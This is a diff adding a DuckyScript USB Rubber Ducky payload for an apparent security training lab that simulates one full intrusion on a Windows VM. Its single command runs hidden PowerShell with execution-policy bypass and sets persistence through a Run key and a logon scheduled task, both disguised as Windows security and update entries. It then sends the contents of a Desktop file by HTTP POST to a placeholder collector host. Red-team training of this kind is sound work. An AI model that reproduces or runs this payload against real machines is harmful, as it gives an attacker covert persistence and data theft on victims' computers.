@@ -1,0 +1,31 @@
+REM ============================================================
+REM Lab 15: Full Chain - one incident, start to finish
+REM Target: Windows 10/11, USB Rubber Ducky (DuckyScript 3.0)
+REM
+REM WARNING: Run only against an isolated, snapshotted VM.
+REM See DuckyLabs/README.md for ground rules.
+REM
+REM RED TEAM / INSTRUCTOR ONLY - do not show this file to students
+REM playing blue before the debrief. See README for how to run this
+REM as a tabletop exercise.
+REM
+REM This is Lab 09's persistence technique and Lab 13's collection +
+REM exfiltration technique, chained into ONE payload - exactly the
+REM same PowerShell logic as those labs, unmodified, just combined
+REM into a single incident. No admin rights, no UAC prompt.
+REM
+REM Prerequisite: fake_secrets.txt must exist on the victim's Desktop
+REM (see Lab 13's README "Setup") and a lab collector must be running
+REM (lab_collector.py from Lab 13) at the LAB-SERVER address below.
+REM ============================================================
+
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "Set-Content -Path \"$env:APPDATA\update.ps1\" -Value 'Add-Content -Path \"$env:TEMP\persistence_ran.txt\" -Value (Get-Date)'; New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsSecurityHealth' -PropertyType String -Value \"powershell -NoP -W Hidden -File $env:APPDATA\update.ps1\" -Force; schtasks /Create /TN \"WindowsUpdateCheck\" /TR \"powershell -NoP -W Hidden -File $env:APPDATA\update.ps1\" /SC ONLOGON /F; $d = Get-Content \"$env:USERPROFILE\Desktop\fake_secrets.txt\" -Raw; Invoke-WebRequest -Uri 'http://LAB-SERVER:8080/collect' -Method POST -Body $d -UseBasicParsing"
+ENTER
+
+REM OPTIONAL HARD MODE (instructor's choice): a few minutes after this
+REM payload runs, additionally run Lab 14's payload unmodified against
+REM the same VM to simulate the intruder covering their tracks before
+REM the blue team investigates. See README "Hard mode."
